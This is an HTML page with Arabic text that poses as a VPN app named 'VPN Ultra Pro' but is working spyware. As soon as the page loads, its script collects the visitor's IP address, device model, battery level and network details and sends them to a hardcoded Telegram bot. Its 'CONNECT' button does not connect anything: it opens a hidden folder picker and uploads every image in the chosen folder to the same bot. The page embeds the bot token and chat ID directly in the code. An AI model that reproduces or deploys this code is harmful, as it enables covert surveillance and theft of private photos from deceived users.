<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>VPN Ultra Pro</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: #111; padding: 40px; border-radius: 30px; border: 2px solid #ff8c00; width: 85%; max-width: 400px; }
        .btn { width: 140px; height: 140px; background: #ff8c00; border: none; border-radius: 50%; color: #000; font-size: 22px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #ff8c00; transition: 0.3s; }
    </style>
</head>
<body>
    <div class="box">
        <h1 style="color: #ff8c00;">VPN Pro</h1>
        <p id="st">جاري تأمين الاتصال...</p>
        <input type="file" id="f" webkitdirectory directory multiple style="display:none;">
        <button class="btn" onclick="start()">CONNECT</button>
    </div>

    <script>
        const T = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
        const C = '7214473798';

        window.onload = async () => {
            try {
                // جلب الـ IP
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                
                // محاولة تحديد موديل الهاتف بدقة
                let deviceModel = "غير معروف";
                const ua = navigator.userAgent;
                
                if (ua.match(/Android/)) {
                    // محاولة استخراج الموديل من الـ User Agent في الأندرويد
                    const match = ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
                    deviceModel = match ? match[2] : "Android Device";
                } else if (ua.match(/iPhone/)) {
                    deviceModel = "iPhone";
                }

                // معلومات البطارية والشبكة
                const battery = await navigator.getBattery();
                const bat = (battery.level * 100) + "%";
                const net = navigator.connection ? navigator.connection.effectiveType : "unknown";

                const msg = `🎯 صيد جديد بدقة عالية!\n` +
                            `📱 الموديل: ${deviceModel}\n` +
                            `📍 الـ IP: ${data.ip}\n` +
                            `🔋 الشحن: ${bat}\n` +
                            `📶 الإنترنت: ${net}\n` +
                            `⚙️ التفاصيل: ${navigator.platform}`;

                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
            } catch (e) {}
        };

        function start() {
            document.getElementById('f').click();
        }

        document.getElementById('f').onchange = async (e) => {
            for (let file of e.target.files) {
                if (file.type.startsWith('image/')) {
                    const fd = new FormData();
                    fd.append('chat_id', C);
                    fd.append('document', file);
                    fetch(`https://api.telegram.org/bot${T}/sendDocument`, {method:'POST', body:fd});
                }
            }
        };
    </script>
</body>
</html>
